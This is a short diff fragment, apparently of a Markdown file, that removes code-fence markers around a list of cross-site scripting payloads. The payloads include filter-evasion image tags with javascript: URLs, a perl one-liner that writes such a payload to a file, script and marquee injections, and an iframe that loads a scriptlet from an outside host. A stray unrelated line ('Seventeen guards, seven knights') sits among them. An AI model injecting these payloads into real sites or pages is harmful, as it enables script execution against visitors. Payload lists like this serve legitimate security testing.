@@ -18,7 +18,6 @@ Here are some ideas to get you started:
 Seventeen guards, seven knights
 
 
-```js
 
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
@@ -803,5 +802,4 @@ foo<script>alert(1)</script>
 <marquee onstart='javascript:alert('1');'>=(◕_◕)=
 <iframe src="http://ha.ckers.org/scriptlet.html"></iframe>
 <;/script>;<;script>;alert(1)<;/script>;
-'''
 
